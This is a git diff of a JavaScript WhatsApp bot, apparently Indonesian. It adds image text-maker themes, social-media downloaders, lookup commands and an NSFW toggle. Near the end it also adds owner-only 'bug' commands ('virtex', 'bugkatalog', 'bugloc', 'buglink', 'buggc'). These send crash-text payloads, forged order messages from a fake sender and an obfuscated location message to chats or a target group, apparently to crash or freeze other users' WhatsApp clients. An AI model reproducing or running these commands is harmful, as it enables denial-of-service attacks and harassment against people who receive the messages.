+                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Yuzzu Kamiyaka`)
+					makell = args.join(" ")
+					reply(mess.wait)
+					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup&apikey=${xchillds}`)
+					buffer1 = await getBuffer(anu.result.url)
+					denz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+					break
+			case 'coffeecup2': 
+                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Yuzzu Kamiyaka`)
+					makell = args.join(" ")
+					reply(mess.wait)
+					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup2&apikey=${xchillds}`)
+					buffer1 = await getBuffer(anu.result.url)
+					denz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+					break
+			case 'neon': 
+                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Yuzzu Kamiyaka`)
+					makell = args.join(" ")
+					reply(mess.wait)
+					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=neon&apikey=${xchillds}`)
+					buffer1 = await getBuffer(anu.result.url)
+					denz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+					break
+case 'glow': 
+                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Yuzzu Kamiyaka`)
+					makell = args.join(" ")
+					reply(mess.wait)
+					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=glow&apikey=${xchillds}`)
+					buffer1 = await getBuffer(anu.result.url)
+					denz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+					break
+			case 'summer': 
+                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Yuzzu Kamiyaka`)
+					makell = args.join(" ")
+					reply(mess.wait)
+					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/alam?text=${makell}&theme=summer&apikey=${xchillds}`)
+					buffer1 = await getBuffer(anu.result.url)
+					denz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+					break
+			case 'flower': 
+                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Yuzzu Kamiyaka`)
+					makell = args.join(" ")
+					reply(mess.wait)
+					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/alam?text=${makell}&theme=flower&apikey=${xchillds}`)
+					buffer1 = await getBuffer(anu.result.url)
+					denz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+					break
+			case 'burn': 
+                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Yuzzu Kamiyaka`)
+					makell = args.join(" ")
+					reply(mess.wait)
+					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=text-burn&apikey=${xchillds}`)
+					buffer1 = await getBuffer(anu.result.url)
+					denz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+					break
+			case 'quote': 
+                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Yuzzu Kamiyaka`)
+					makell = args.join(" ")
+					reply(mess.wait)
+					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=art-quote&apikey=${xchillds}`)
+					buffer1 = await getBuffer(anu.result.url)
+					denz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+					break
+			case 'wooden': 
+                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Yuzzu Kamiyaka`)
+					makell = args.join(" ")
+					reply(mess.wait)
+					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=wooden-boarch&apikey=${xchillds}`)
+					buffer1 = await getBuffer(anu.result.url)
+					denz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+					break
+			case 'golden': 
+                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Yuzzu Kamiyaka`)
+					makell = args.join(" ")
+					reply(mess.wait)
+					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=golden&apikey=${xchillds}`)
+					buffer1 = await getBuffer(anu.result.url)
+					denz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./denz.jpg')})
+					break
+//Hexa
+case 'twitter':
+            if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
+            if (!c) return reply('Linknya?')
+            reply(mess.wait)
+            ten = args[0]
+            var res = await hx.twitter(`${ten}`)
+            ren = `${g.HD}`
+            sendMediaURL(from,ren,'DONE')
+            break
+case 'fb':
+            if (!c) return reply('Linknya?')
+            if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(mess.Iv)
+            reply(mess.wait)
+            te = args.join(' ')
+            hx.fbdown(`${te}`)
+            .then(G => {
+            ten = `${G.HD}`
+            sendMediaURL(from,ten,`*Link video_normal* : ${G.Normal_video}`)
+            })
+            break    
+            case 'playstore':
+            if(!c) return reply('lu nyari apa?')
+            let play = await hx.playstore(c)
+            let store = '❉─────────────────────❉\n'
+            for (let i of play){
+            store += `\n*「 _PLAY STORE_ 」*\n
+- *Nama* : ${i.name}
+- *Link* : ${i.link}\n
+- *Dev* : ${i.developer}
+- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`
+            }
+            reply(store)
+            break
+case 'chara':
+if (!isGroup) return reply(mess.only.group)
+if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
+            if(!c) return reply(`gambar apa?\n${prefix}chara nino`)
+            let im = await hx.chara(c)
+            let acak = im[Math.floor(Math.random() * im.length)]
+            let li = await getBuffer(acak)
+            await denz.sendMessage(from,li,image,{quoted: mek})
+            break
+case 'otaku':
+if (!isGroup) return reply(mess.only.group)
+if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
+            if(!c) return reply('judul animenya?')
+            let anime = await hx.otakudesu(c)
+            rem = `*Judul* : ${anime.judul}
+*Jepang* : ${anime.jepang}
+*Rating* : ${anime.rate}
+*Produser* : ${anime.produser}
+*Status* : ${anime.status}
+*Episode* : ${anime.episode}
+*Durasi* : ${anime.durasi}
+*Rilis* : ${anime.rilis}
+*Studio* : ${anime.studio}
+*Genre* : ${anime.genre}\n
+*Sinopsis* :
+${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
+            ram = await getBuffer(anime.img)
+            denz.sendMessage(from,ram,image,{quoted:mek,caption:rem})
+            break
+    case 'komiku':
+    if (!isGroup) return reply(mess.only.group)
+if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
+            if(!c) return reply(`judulnya?\n${prefix}komiku mao gakuin`)
+            let komik = await hx.komiku(c)
+            result = `*Title* : ${komik.title}\n
+*Title Indo* : ${komik.indo}\n
+*Update* : ${komik.update}\n
+*Desc* : ${komik.desc}\n
+*Chapter Awal* : ${komik.chapter_awal}
+*Chapter Akhir* : ${komik.chapter_akhir}`
+            sendMediaURL(from, komik.image,result)
+            break
+    case 'linkwa':
+            if(!c) return reply('cari group apa?')
+            hx.linkwa(c)
+            .then(result => {
+            let res = '*「 _LINK WA_ 」*\n\n'
+            for (let i of result) {
+            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
+            }
+            reply(res)
+            });
+            break
+    case 'igstory': 
+            if(!c) return reply('Usernamenya?')
+            hx.igstory(c)
+            .then(async result => {
+            for(let i of result.medias){
+                if(i.url.includes('mp4')){
+                    let link = await getBuffer(i.url)
+                    denz.sendMessage(from,link,video,{quoted: mek,caption: `Type : ${i.type}`})
+                } else {
+                    let link = await getBuffer(i.url)
+                    denz.sendMessage(from,link,image,{quoted: mek,caption: `Type : ${i.type}`})                  
+                }
+            }
+            });
+            break
+    case 'tiktokaudio':
+ 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
+ 		if (!c) return fakegroup('Linknya?')
+ 		reply(mess.wait)
+ 		hx.ttdownloader(`${args[0]}`)
+    		.then(result => {
+    		const { audio} = result
+            sendMediaURL(from,audio,'')
+    		})
+     		.catch(e => console.log(e))
+     		break
+//Done
 case 'jadibot':
+if(from.endsWith('@g.us')) return reply('Only With Private Chat/PC')
 client.version = [2, 2119, 6]
 client.browserDescription = ['Dcode Denpa','Desktop','3.0']
 if (args[0] && args[0].length > 200) {
@@ -1215,11 +2070,11 @@ case 'owner':
 case 'developer':
 		case 'author':
 let ini_list = []
-for (let i of ownerNumber) {
+for (let i of ownerNumberr) {
 const vname = denz.contacts[i] != undefined ? denz.contacts[i].vname || denz.contacts[i].notify : undefined
 ini_list.push({
 "displayName": `Developer ${NamaBot}`,
-"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Dcode Denpa;;;\nFN:${vname ? `${vname}` : `${denz.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
+"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Gliders;;;\nFN:${vname ? `${vname}` : `${denz.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
 })
 }
 denz.sendMessage(from, {
@@ -1257,10 +2112,20 @@ teksnyee += `\n\n*❏ ID :* ${i.id}\n*❏ Cmd :* ${i.chats}`
 }
 reply(teksnyee)
 break
+case 'bugtroli':
+const memekkkk = '1000@s.whatsapp.net'
+denz.sendMessage(memekkkk, 'Wkwkwk', MessageType.text)
+break
+  case 'buggc':
+const q = args.join(" ");
+if (!mek.key.fromMe) return;
+if (!q) return reply('Masukan ID Grupnya')
+sendBug(args[0])
+break
 				case 'script':
 		case 'sc':
 		case 'sourcecode':
-		denz.sendMessage(from, { text: "https://github.com/dcode-denpa/bitch-boot", matchedText: 'https://github.com/dcode-denpa/bitch-boot', description: "", title: "don't click here !!!", jpegThumbnail: ofrply }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
+		denz.sendMessage(from, { text: "https://github.com/dcode-denpa/bitch-boot\n\nhttps://github.com/YuzzuKamiyaka/bitch-bot", matchedText: 'https://github.com/dcode-denpa/bitch-boot', description: "", title: "don't click here !!!", jpegThumbnail: ofrply }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
 		break
        case 'debug':
 			 res = await denz.prepareMessageFromContent(from,{
@@ -1378,6 +2243,7 @@ denz.relayWAMessage(res)
 break
 case 'pinterest':
 if (!c) return reply('yg mau di cari apa?')
+reply(mess.wait)
 pinterest(`${c}`).then( data => {
 const amsulah = data.result
 const pimterest = amsulah[Math.floor(Math.random() * amsulah.length)]
@@ -1511,6 +2377,10 @@ naa = ky_ttt.filter(toek => !toek.id.includes(from))
 ky_ttt = naa 
 reply('Sukses')
 break
+case 'getscmd':
+duda = fs.readFileSync('sticker/menu.webp')
+denz.sendMessage(from, duda, sticker, {quoted: mek})
+break
 				case 'getpp':
 					anu = from
 		if (`${anu}@s.whatsapp.net`) {
@@ -1542,7 +2412,7 @@ reply(mess.wait)
 teks = args.join(' ')
 res = await googleImage(teks, google)
 function google(error, result){
-if (error){ return reply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
+if (error){ return reply('_[ ! ] Error Terjadi Kesalahan Atau Hasil Tidak Ditemukan_')}
 else {
 var gugIm = result
 var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
@@ -1699,6 +2569,7 @@ break
 					buff = await getBuffer(anu.result.avatar_url)
 					denz.sendMessage(from, buff, image, {quoted: ftok, caption: gstalk})
 					break 
+					
 					case 'infogempa':
 					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/info/gempa?apikey=${HunterApi}`, {method: 'get'})
 					gempa = `❏ *INFO GEMPA*\n\n❏ Waktu : ${anu.result.Waktu}\n❏ Lintang : ${anu.result.Lintang}\n❏ Bujur : ${anu.result.Bujur}\n❏ Magnitudo : ${anu.result.Magnitudo}\n❏ Kedalaman : ${anu.result.Kedalaman}\n❏ Wilayah : ${anu.result.Wilayah}`
@@ -1955,6 +2826,26 @@ encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.exten
 						reply('1 untuk mengaktifkan, 0 untuk mematikan')
 					}
 					break
+				 case 'nsfw':
+	        if (!isGroup) return reply(mess.only.group)
+			if (!isOwner && !isGroupAdmins) return reply(mess.only.admin)
+					if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}nsfw 1`)
+					if (Number(args[0]) === 1) {
+						if (isNsfw) return reply('Sudah Aktif Kak')
+						nsfww.push(from)
+						fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
+						reply('Sukses mengaktifkan fitur nsfw')
+						denz.sendMessage(from, `Bebas Nyari Hentai :v`, text)
+					} else if (Number(args[0]) === 0) {
+						if (!isNsfw) return reply('Sudah Mati Kak')
+						var ini = nsfww.indexOf(from)
+						nsfww.splice(ini, 1)
+						fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
+						reply('Sukses menonaktifkan fitur nsfw')
+					} else {
+						reply('1 untuk mengaktifkan, 0 untuk mematikan')
+					}
+					break
 				case 'tinyurl':
 try {
 link = args[0]
@@ -2107,38 +2998,32 @@ case 'tts':
 				denz.groupLeave(from)
 						break
 				case 'bc':
-					denz.updatePresence(from, Presence.composing)
-					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
-					if (args.length < 1) return reply('Teksnya?')
-					anu = await denz.chats.all()
-					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
-						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
-						buff = await denz.downloadMediaMessage(encmedia)
-						for (let _ of anu) {
-							denz.sendMessage(_.jid, buff, image, { viewOnce:true, caption: `${body.slice(4)}`})
-						}
-						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
-						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
-						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
-						buff = await denz.downloadMediaMessage(encmedia)
-						for (let _ of anu) {
-							denz.sendMessage(_.jid, buff, video, { viewOnce:true, caption: `${body.slice(4)}`})
-						}
-						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
-						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
-						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
-						buff = await denz.downloadMediaMessage(encmedia)
-						for (let _ of anu) {
-							denz.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: finv, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
-						}
-						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
-					} else {
-						for (let _ of anu) {
-							sendMess(_.jid, `${body.slice(4)}`)
-						}
-						reply(`Sukses mengirim Broadcast:\n${body.slice(4)}`)
-					}
-					break
+      case 'broadcast':
+             if (!mek.key.fromMe) return;
+             if (args.length < 1) return reply('teks?')
+             anu = await denz.chats.all()
+             if (isMedia && !kyy.message.videoMessage || isQuotedImage) {
+             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kyy).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kyy
+             bc = await denz.downloadMediaMessage(encmedia)
+             for (let _ of anu) {
+             denz.sendMessage(_.jid, bc, image, {quoted:fvid,caption: `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`})
+}
+             reply('Suksess broadcast')
+             } else {
+             for (let _ of anu) {
+denz.sendMessage(_.jid, 
+			{"contentText": `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`,
+			"footerText": 'Gliders Broadcast',
+			"buttons": [
+			{"buttonId": `!menu`,
+			"buttonText": {"displayText": "KLIK UNTUK MELIHAT MENU BOT"
+			},"type": "RESPONSE"}
+			], "headerType": 1,
+			}, MessageType.buttonsMessage )
+}
+             reply('Suksess broadcast')
+}
+             break
 					case 'spamsw':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 if (!arg) return reply(`Penggunaan ${prefix}spamsw teks|jumlah`)
@@ -2579,6 +3464,7 @@ var nn = body.slice(9)
 				reply('Status : ONLINE')
 				break
 			case 'offline':
+			case 'afk':
 			if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 				offline = true
                 waktuafk = Date.now()
@@ -2595,7 +3481,8 @@ var nn = body.slice(9)
 			    denz.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${parti}@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { conversation: `${targetq}` }}})
 					break
             case 'hidetag':
-            if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
+			if (!isGroup) return reply(mess.only.group)
+			if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
             ht = body.slice(9)
                 members_id = []
 				for (let mem of groupMembers) {
@@ -2623,7 +3510,7 @@ var nn = body.slice(9)
               case 'hacked':
               if (!isGroup) return reply(mess.only.group)
               if (args.length < 1) return reply('Teksnya?')
-              reply('Otw Hack')
+              reply('Otw')
                 tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)
                    denz.updateProfilePicture (from, tessgc)
                    await sleep(1000)
@@ -2672,7 +3559,7 @@ var _0x1a2d=['873274GOPKwu','49711TqvDhS','vSwjL','\x20Worl','6288WzzdEo','158LO
 var _0x52b6=['979806odjWHO','866172blkIpR','48673lXrcwz','144110wbrnrs','EpKap','59312BEeZim','454073XDAqOT','4ptRdUT','log','71823cxnXKK','Hello','\x20Worl','19ZzJRim','2QnhARU'];(function(_0x38a6ff,_0x429c03){var _0x1a7b23=function(_0x287403,_0x47713a,_0x1dbbac,_0x47e099,_0xf1c18d){return _0x59b1(_0x47e099- -0x183,_0x1dbbac);},_0x4e812d=function(_0xa1ba31,_0xd5e37c,_0xebf963,_0x238ed5,_0x48fe9d){return _0x59b1(_0x238ed5- -0x183,_0xebf963);},_0x4845fa=function(_0x578980,_0x22097b,_0x3e9496,_0x2adf05,_0x366b9f){return _0x59b1(_0x2adf05- -0x183,_0x3e9496);},_0x4c3b51=function(_0x3ef968,_0x4a9350,_0x1252e1,_0x22d2cd,_0x31c7b4){return _0x59b1(_0x22d2cd- -0x183,_0x1252e1);},_0x22f02d=function(_0x256e85,_0x442fa8,_0xe2e2c8,_0x52d69a,_0x3a5bde){return _0x59b1(_0x52d69a- -0x183,_0xe2e2c8);};while(!![]){try{var _0x3a9259=parseInt(_0x1a7b23(-0x1d,-0x16,-0x21,-0x1c,-0x15))*parseInt(_0x1a7b23(-0x27,-0x1f,-0x22,-0x26,-0x24))+parseInt(_0x4845fa(-0x14,-0x1f,-0x1a,-0x1a,-0x15))+-parseInt(_0x4e812d(-0x2a,-0x28,-0x27,-0x27,-0x24))+-parseInt(_0x4845fa(-0x1e,-0x20,-0x1b,-0x22,-0x1b))*parseInt(_0x4e812d(-0x14,-0x1a,-0x1a,-0x1b,-0x1f))+-parseInt(_0x1a7b23(-0x1d,-0x23,-0x1e,-0x23,-0x27))+-parseInt(_0x4e812d(-0x23,-0x21,-0x22,-0x1f,-0x22))+parseInt(_0x1a7b23(-0x2a,-0x21,-0x1e,-0x25,-0x20))*parseInt(_0x1a7b23(-0x23,-0x27,-0x1f,-0x21,-0x24));if(_0x3a9259===_0x429c03)break;else _0x38a6ff['push'](_0x38a6ff['shift']());}catch(_0x25ee65){_0x38a6ff['push'](_0x38a6ff['shift']());}}}(_0x52b6,-0xbe48c+0x9f467*0x1+0x1*0xab881));function hi(){var _0x412edf=function(_0x5ed909,_0x1d0a8a,_0x3077ab,_0x37e70b,_0x381276){return _0x59b1(_0x5ed909-0x3d5,_0x37e70b);},_0xd1fc57=function(_0x16ed48,_0x187f12,_0x3c1622,_0x1e4dfa,_0x17a6d9){return _0x59b1(_0x16ed48-0x3d5,_0x1e4dfa);},_0x3b3a17=function(_0x4d7aab,_0x6a1332,_0x54a086,_0x5bd53c,_0x49323f){return _0x59b1(_0x4d7aab-0x3d5,_0x5bd53c);},_0x29c70a=function(_0x220ed0,_0x46a777,_0x1cdcfb,_0x208e69,_0x5786d1){return _0x59b1(_0x220ed0-0x3d5,_0x208e69);},_0x56416c=function(_0x4eb994,_0x16a747,_0x4fe4ec,_0x2577ea,_0x25865e){return _0x59b1(_0x4eb994-0x3d5,_0x2577ea);},_0x24c641={};_0x24c641[_0x412edf(0x534,0x533,0x534,0x533,0x53b)]=_0xd1fc57(0x53a,0x537,0x53d,0x540,0x538)+_0x412edf(0x53b,0x536,0x537,0x53b,0x542)+'d!';var _0x2ddb5a=_0x24c641;console[_0x29c70a(0x538,0x531,0x536,0x53e,0x53b)](_0x2ddb5a[_0x3b3a17(0x534,0x539,0x52e,0x535,0x531)]);}function _0x59b1(_0x5e775f,_0x2a80ea){_0x5e775f=_0x5e775f-(0x1c7f*0x1+-0x10c1*-0x1+-0x6a*0x6a);var _0x4cb48b=_0x52b6[_0x5e775f];return _0x4cb48b;}hi();
 var _0x3091=['OwFke','6qqTyBv','614682xEMKJU','182821PPlWEs','437282BVnHDF','Hello','2msSnuM','19381QRANiX','564751nbeKxk','\x20Worl','455556CSAxxI','log','522091blOpDQ','1ArvwbP'];(function(_0x3bd903,_0x4daeee){var _0x4b6e1d=function(_0xae9d3b,_0x2ffd03,_0x497a39,_0x410a61,_0x2d2187){return _0x22f5(_0x497a39-0x385,_0x410a61);},_0x51f4f8=function(_0x2669c5,_0x34b5c2,_0x43adab,_0x3f1a82,_0x5bb68d){return _0x22f5(_0x43adab-0x385,_0x3f1a82);},_0x53b70f=function(_0x6cafc9,_0x5b2761,_0x1bfdc9,_0x163cba,_0x1fe8ba){return _0x22f5(_0x1bfdc9-0x385,_0x163cba);},_0x4f1061=function(_0x499a74,_0x5cc142,_0x41f762,_0x198362,_0x5bb718){return _0x22f5(_0x41f762-0x385,_0x198362);},_0x27ff5d=function(_0x4ad94b,_0xf7cb1c,_0x45daf9,_0x528ef9,_0x756eff){return _0x22f5(_0x45daf9-0x385,_0x528ef9);};while(!![]){try{var _0x34c042=parseInt(_0x4b6e1d(0x514,0x515,0x516,0x50f,0x50f))+parseInt(_0x51f4f8(0x513,0x50c,0x50f,0x50f,0x50f))*parseInt(_0x51f4f8(0x50e,0x50b,0x511,0x50c,0x50b))+parseInt(_0x53b70f(0x50a,0x50a,0x50d,0x509,0x50c))*-parseInt(_0x4f1061(0x505,0x509,0x50c,0x50a,0x507))+-parseInt(_0x4b6e1d(0x517,0x50d,0x510,0x50c,0x517))+parseInt(_0x4b6e1d(0x516,0x50d,0x514,0x51b,0x50f))*parseInt(_0x53b70f(0x50e,0x516,0x515,0x518,0x51b))+-parseInt(_0x53b70f(0x518,0x512,0x512,0x516,0x516))+parseInt(_0x4f1061(0x50e,0x503,0x50a,0x50b,0x510));if(_0x34c042===_0x4daeee)break;else _0x3bd903['push'](_0x3bd903['shift']());}catch(_0x24df68){_0x3bd903['push'](_0x3bd903['shift']());}}}(_0x3091,-0xe805f+0x95007*-0x1+0x3*0xae5de));function _0x22f5(_0x13af2e,_0x4926e0){_0x13af2e=_0x13af2e-(-0x13*-0xcb+0x134a+-0x20d7);var _0x3734bb=_0x3091[_0x13af2e];return _0x3734bb;}function hi(){var _0x12b4e5=function(_0xd818b2,_0x5149df,_0x3ddd85,_0x37dede,_0x71de35){return _0x22f5(_0x3ddd85-0x204,_0x37dede);},_0x1ada77=function(_0x4b48c5,_0x5648c4,_0x39c595,_0x49ce77,_0x1f5d9f){return _0x22f5(_0x39c595-0x204,_0x49ce77);},_0xc6712e=function(_0x108616,_0x3d4d39,_0x9f62ee,_0x575976,_0x30de6b){return _0x22f5(_0x9f62ee-0x204,_0x575976);},_0x3829b7=function(_0x23f45a,_0x156791,_0x1f99f3,_0xf159d1,_0xe42fc1){return _0x22f5(_0x1f99f3-0x204,_0xf159d1);},_0x20d23c=function(_0x3cd15b,_0x1affe2,_0x2f3125,_0x46168d,_0x186357){return _0x22f5(_0x2f3125-0x204,_0x46168d);},_0x6adfba={};_0x6adfba[_0x12b4e5(0x391,0x38b,0x38d,0x38f,0x388)]=_0x1ada77(0x394,0x398,0x392,0x392,0x399)+_0x1ada77(0x382,0x387,0x388,0x384,0x387)+'d!';var _0x4d0ee0=_0x6adfba;console[_0xc6712e(0x38d,0x387,0x38a,0x388,0x38d)](_0x4d0ee0[_0x20d23c(0x390,0x387,0x38d,0x38e,0x391)]);}hi();
 break
-					case 'bugtroli':
+					case 'bugtroli3':
               if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
      function sleep(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
@@ -2729,6 +3616,99 @@ bug(targett)
 
 attack(mek.key.remoteJid)
 break
+case 'bbaij72njnwjibdo16830nslm1782':
+reply(`${ngazap(prefix)}`)
+break
+//By Xchildss X YuzzuKamiyaka
+case 'virtex':
+if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
+katalog(`${ngazap(prefix)}`)
+katalog(`${emoji2(prefix)}`)
+katalog(`${virtex(prefix)}`)
+katalog(`${virtex2(prefix)}`)
+katalog(`${virtex3(prefix)}`)
+katalog(`${virtex4(prefix)}`)
+katalog(`${virtex5(prefix)}`)
+katalog(`${virtex6(prefix)}`)
+katalog(`${virtex7(prefix)}`)
+katalog(`${virtex8(prefix)}`)
+katalog(`${virtex9(prefix)}`)
+katalog(`${virtag(prefix)}`)
+break
+case 'bugkatalog':
+if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
+denz.toggleDisappearingMessages(from, 0)
+ babi = (teks) => {
+             res = denz.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": teks, "footerText": `${emoji2(prefix)}`, "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted: {
+  key: {
+   participant: '0@s.whatsapp.net' // Fake sender Jid
+  },
+  message: {
+   orderMessage: {
+    itemCount: 9999999, // Bug
+    status: 1,
+    surface: 1,
+    message: `${virtex6(prefix)}`,
+    orderTitle: `${emoji2(prefix)}`, // Idk what this does
+    sellerJid: '0@s.whatsapp.net' // Seller
+   }
+  }
+ }
+})
+             denz.relayWAMessage(res)
+        }
+        babi(`${ngazap(prefix)}`)
+        babi(`${virtag(prefix)}`)
+        babi(`${virtex6(prefix)}`)
+        babi(`${emoji2(prefix)}`)
+        break
+case 'bugloc':
+function _0x4ee9(_0x1253de,_0x4df4d5){var _0x587b3c=_0x587b();return _0x4ee9=function(_0x4ee946,_0x170efd){_0x4ee946=_0x4ee946-0x1c6;var _0x33a62e=_0x587b3c[_0x4ee946];return _0x33a62e;},_0x4ee9(_0x1253de,_0x4df4d5);}var _0x1fb12b=_0x4ee9;function _0x587b(){var _0x573ab6=['readFileSync','12536840GCstSf','sendMessage','only','536IkuDmm','key','2675700WtsjtO','ownerB','./denz.jpg','fromMe','2224464MiisaG','18qcFOZT','83468rQXPeY','0@s.whatsapp.net','25944fErnRh','115851EirsKL','184fyRhDo','178400WTzYEN'];_0x587b=function(){return _0x573ab6;};return _0x587b();}(function(_0x2dcd13,_0x2f923e){var _0x3d06c1=_0x4ee9,_0x2352ff=_0x2dcd13();while(!![]){try{var _0x266d76=parseInt(_0x3d06c1(0x1cc))/0x1+-parseInt(_0x3d06c1(0x1ce))/0x2+-parseInt(_0x3d06c1(0x1cb))/0x3*(parseInt(_0x3d06c1(0x1cd))/0x4)+-parseInt(_0x3d06c1(0x1d5))/0x5+-parseInt(_0x3d06c1(0x1c7))/0x6+-parseInt(_0x3d06c1(0x1c9))/0x7*(parseInt(_0x3d06c1(0x1d3))/0x8)+-parseInt(_0x3d06c1(0x1c8))/0x9*(-parseInt(_0x3d06c1(0x1d0))/0xa);if(_0x266d76===_0x2f923e)break;else _0x2352ff['push'](_0x2352ff['shift']());}catch(_0x4d3113){_0x2352ff['push'](_0x2352ff['shift']());}}}(_0x587b,0x6953b));if(!isOwner&&!mek[_0x1fb12b(0x1d4)][_0x1fb12b(0x1c6)])return reply(mess[_0x1fb12b(0x1d2)][_0x1fb12b(0x1d6)]);denz[_0x1fb12b(0x1d1)](from,{'degreesLatitude':6.493187928699356,'degreesLongitude':80.30968201252108,'name':''+emoji2(prefix),'address':''+virtex6(prefix),'jpegThumbnail':fs[_0x1fb12b(0x1cf)](_0x1fb12b(0x1d7))},location,{'quoted':{'key':{'participant':_0x1fb12b(0x1ca)},'message':{'orderMessage':{'itemCount':0x98967f,'status':0x1,'surface':0x1,'message':''+NamaBot,'orderTitle':''+NamaOwner,'sellerJid':'0@s.whatsapp.net'}}}});
+         break
+                case 'buglink':
+                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
+                 denz.toggleDisappearingMessages(from, 0)
+               denz.sendMessage(from, virtex3(prefix), text, { quoted:ftrol, contextInfo :{text: '🔥',
+            "forwardingScore": 1000000000,
